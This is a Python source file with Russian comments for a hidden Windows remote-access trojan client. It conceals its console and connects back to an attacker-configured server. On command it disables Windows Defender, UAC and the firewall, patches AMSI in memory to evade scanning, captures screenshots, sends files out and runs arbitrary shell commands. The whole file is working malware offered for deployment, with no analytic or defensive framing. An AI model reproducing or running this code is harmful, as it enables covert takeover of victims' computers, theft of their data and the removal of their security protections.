# -*- coding: utf-8 -*-
import socket
import os
import subprocess
import sys
import time
import ctypes
import threading

# ========== ПОЛНОЕ УНИЧТОЖЕНИЕ КОНСОЛИ ==========
if sys.platform == "win32":
    # Получаем handle окна
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        # Полностью уничтожаем окно
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        # Убираем из панели задач
        ctypes.windll.user32.SetWindowLongW(hwnd, -20, 0x80)
        # Убираем из Alt+Tab
        ctypes.windll.user32.SetWindowLongW(hwnd, -8, 0x80)
        # Убиваем консоль
        ctypes.windll.kernel32.FreeConsole()
    
    # Отключаем Ctrl+C
    ctypes.windll.kernel32.SetConsoleCtrlHandler(None, 1)
    
    # Постоянный поток-убийца (на случай воскрешения)
    def kill_console():
        while True:
            try:
                h = ctypes.windll.kernel32.GetConsoleWindow()
                if h:
                    ctypes.windll.user32.ShowWindow(h, 0)
                    ctypes.windll.kernel32.FreeConsole()
            except:
                pass
            time.sleep(0.1)
    
    thread = threading.Thread(target=kill_console, daemon=True)
    thread.start()
# =================================================

# ========== НАСТРОЙКИ ==========
SERVER_IP = "192.168.31.177"  # ⚡ ИЗМЕНИ НА IP СВОЕГО СЕРВЕРА
SERVER_PORT = 5555
# ===============================

# ===== ФУНКЦИИ ДЛЯ СКРЫТНОГО ЗАПУСКА =====
def hidden_run(cmd, capture=True):
    """Запускает команду без показа окон"""
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE
    
    if capture:
        return subprocess.run(
            cmd,
            shell=True if isinstance(cmd, str) else False,
            capture_output=True,
            text=True,
            timeout=30,
            startupinfo=startupinfo,
            creationflags=0x08000000  # CREATE_NO_WINDOW
        )
    else:
        return subprocess.run(
            cmd,
            shell=True if isinstance(cmd, str) else False,
            startupinfo=startupinfo,
            creationflags=0x08000000
        )

def hidden_ps(script, capture=True):
    """Запускает PowerShell скрипт без окон"""
    return hidden_run(["powershell", "-Command", script], capture)

# ===== 1. ПРОЦЕССЫ И СЛУЖБЫ =====
def get_processes():
    try:
        result = hidden_run("tasklist /FO CSV")
        return result.stdout
    except Exception as e:
        return f"Error: {e}"

def kill_process(pid):
    try:
        result = hidden_run(f"taskkill /F /PID {pid}")
        return result.stdout + result.stderr
    except Exception as e:
        return f"Error: {e}"

def get_services():
    try:
        result = hidden_run("sc query state= all")
        return result.stdout
    except Exception as e:
        return f"Error: {e}"

def stop_service(name):
    try:
        result = hidden_run(f"net stop {name}")
        return result.stdout + result.stderr
    except Exception as e:
        return f"Error: {e}"

def start_service(name):
    try:
        result = hidden_run(f"net start {name}")
        return result.stdout + result.stderr
    except Exception as e:
        return f"Error: {e}"

# ===== 2. ОТКЛЮЧЕНИЕ ЗАЩИТЫ =====
def disable_defender():
    try:
        script = '''
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -PUAProtection 0
Add-MpPreference -ExclusionPath "C:"
Add-MpPreference -ExclusionPath "D:"
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
Stop-Service WinDefend -Force
Set-Service WinDefend -StartupType Disabled
'''
        hidden_ps(script, capture=False)
        return "✅ Defender disabled"
    except Exception as e:
        return f"❌ Error: {e}"

def disable_uac():
    try:
        script = '''
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0
'''
        hidden_ps(script, capture=False)
        return "✅ UAC disabled (reboot may be needed)"
    except Exception as e:
        return f"❌ Error: {e}"

def disable_firewall():
    try:
        hidden_run("netsh advfirewall set allprofiles state off", capture=False)
        return "✅ Firewall disabled"
    except Exception as e:
        return f"❌ Error: {e}"

# ===== 3. AMSI BYPASS =====
def bypass_amsi():
    try:
        script = '''
$Win32 = Add-Type -memberDefinition @"
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -name "Win32" -namespace Win32Functions -passthru

$ptr = $Win32::GetProcAddress($Win32::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
$b = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
$Win32::VirtualProtect($ptr, [UIntPtr]::new(6), 0x40, [ref] 0)
[System.Runtime.InteropServices.Marshal]::Copy($b, 0, $ptr, 6)
'''
        hidden_ps(script, capture=False)
        return "✅ AMSI bypassed"
    except Exception as e:
        return f"❌ Error: {e}"

# ===== 4. ОТПРАВКА СООБЩЕНИЙ =====
def show_message(title, text, msg_type=0):
    """
    msg_type: 0 - info (i), 1 - warning (!), 2 - error (✕)
    """
    try:
        icon_map = {0: 0x40, 1: 0x30, 2: 0x10}
        icon = icon_map.get(msg_type, 0x40)
        ctypes.windll.user32.MessageBoxW(0, text, title, icon)
        return "✅ Message shown"
    except Exception as e:
        return f"❌ Error: {e}"

# ===== 5. СКРИНШОТ (БЕЗ ОКОН) =====
def take_screenshot():
    try:
        script = '''
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
$stream = New-Object System.IO.MemoryStream
$bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
[System.Convert]::ToBase64String($stream.ToArray())
'''
        result = hidden_ps(script)
        if result.returncode == 0 and result.stdout:
            import base64
            return base64.b64decode(result.stdout)
        return b"SCREEN_ERROR"
    except Exception as e:
        return f"SCREEN_ERROR: {e}".encode()

# ===== 6. СИСТЕМНАЯ ИНФОРМАЦИЯ =====
def get_system_info():
    return f"""Computer: {os.getenv('COMPUTERNAME', 'Unknown')}
User: {os.getenv('USERNAME', 'Unknown')}
OS: {os.getenv('OS', 'Unknown')}
Arch: {os.getenv('PROCESSOR_ARCHITECTURE', 'Unknown')}
Current Dir: {os.getcwd()}"""

# ===== 7. ФАЙЛОВЫЙ МЕНЕДЖЕР =====
def list_files(path):
    try:
        files = os.listdir(path if path else ".")
        result = f"Directory: {os.path.abspath(path if path else '.')}\n"
        result += "-"*50 + "\n"
        for f in sorted(files):
            full = os.path.join(path if path else ".", f)
            if os.path.isdir(full):
                result += f"[DIR]  {f}\n"
            else:
                size = os.path.getsize(full)
                result += f"[FILE] {f} ({size} bytes)\n"
        return result
    except Exception as e:
        return f"Error: {e}"

def send_file(sock, path):
    try:
        if not os.path.exists(path):
            sock.send(b"ERROR: File not found")
            return
        size = os.path.getsize(path)
        sock.send(str(size).encode())
        ack = sock.recv(1024)
        with open(path, "rb") as f:
            sock.sendall(f.read())
    except Exception as e:
        sock.send(f"ERROR: {e}".encode())

# ===== 8. КОМАНДЫ =====
def execute_cmd(command):
    try:
        result = hidden_run(command)
        return (result.stdout + result.stderr).encode()
    except Exception as e:
        return f"ERROR: {e}".encode()

def get_netstat():
    try:
        result = hidden_run("netstat -an")
        return result.stdout.encode()
    except Exception as e:
        return f"ERROR: {e}".encode()

# ===== ПОДКЛЮЧЕНИЕ =====
def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except:
            time.sleep(5)

# ===== ОСНОВНОЙ ЦИКЛ =====
if __name__ == "__main__":
    while True:
        try:
            sock = connect()
            sock.send(b"WINDOWS_ULTIMATE_READY")
            
            while True:
                try:
                    cmd = sock.recv(4096).decode().strip()
                    if not cmd:
                        break
                    
                    # ===== ВЫХОД =====
                    if cmd == "EXIT":
                        sock.close()
                        sys.exit(0)
                    
                    # ===== СИСТЕМА =====
                    elif cmd == "SYSTEM_INFO":
                        sock.send(get_system_info().encode())
                    
                    # ===== ПРОЦЕССЫ =====
                    elif cmd == "PS_LIST":
                        sock.send(get_processes().encode())
                    
                    elif cmd.startswith("PS_KILL "):
                        pid = cmd[8:].strip()
                        sock.send(kill_process(pid).encode())
                    
                    # ===== СЛУЖБЫ =====
                    elif cmd == "SVC_LIST":
                        sock.send(get_services().encode())
                    
                    elif cmd.startswith("SVC_STOP "):
                        name = cmd[9:].strip()
                        sock.send(stop_service(name).encode())
                    
                    elif cmd.startswith("SVC_START "):
                        name = cmd[10:].strip()
                        sock.send(start_service(name).encode())
                    
                    # ===== ЗАЩИТА =====
                    elif cmd == "DEFENDER_OFF":
                        sock.send(disable_defender().encode())
                    
                    elif cmd == "UAC_OFF":
                        sock.send(disable_uac().encode())
                    
                    elif cmd == "FIREWALL_OFF":
                        sock.send(disable_firewall().encode())
                    
                    # ===== ОБХОД =====
                    elif cmd == "AMSI_BYPASS":
                        sock.send(bypass_amsi().encode())
                    
                    # ===== СООБЩЕНИЯ =====
                    elif cmd.startswith("MSG "):
                        # Формат: MSG Заголовок|Текст|Тип(0-2)
                        try:
                            parts = cmd[4:].split("|")
                            if len(parts) >= 2:
                                title = parts[0]
                                text = parts[1]
                                msg_type = int(parts[2]) if len(parts) > 2 else 0
                                sock.send(show_message(title, text, msg_type).encode())
                            else:
                                sock.send(b"ERROR: Invalid format. Use: MSG Title|Text|Type")
                        except Exception as e:
                            sock.send(f"ERROR: {e}".encode())
                    
                    # ===== СКРИНШОТ =====
                    elif cmd == "SCREEN":
                        img = take_screenshot()
                        if isinstance(img, bytes) and not img.startswith(b"SCREEN_ERROR"):
                            sock.send(str(len(img)).encode())
                            ack = sock.recv(1024)
                            sock.sendall(img)
                        else:
                            sock.send(img)
                    
                    # ===== ФАЙЛЫ =====
                    elif cmd.startswith("LIST "):
                        path = cmd[5:].strip()
                        sock.send(list_files(path).encode())
                    
                    elif cmd.startswith("CD "):
                        path = cmd[3:].strip()
                        try:
                            os.chdir(path)
                            sock.send(f"OK: {os.getcwd()}".encode())
                        except Exception as e:
                            sock.send(f"ERROR: {e}".encode())
                    
                    elif cmd.startswith("GET "):
                        send_file(sock, cmd[4:].strip())
                    
                    # ===== КОМАНДЫ =====
                    elif cmd.startswith("CMD "):
                        sock.send(execute_cmd(cmd[4:].strip()))
                    
                    elif cmd == "NETSTAT":
                        sock.send(get_netstat())
                    
                    else:
                        sock.send(b"UNKNOWN COMMAND")
                        
                except Exception as e:
                    break
                    
            sock.close()
        except:
            time.sleep(5)
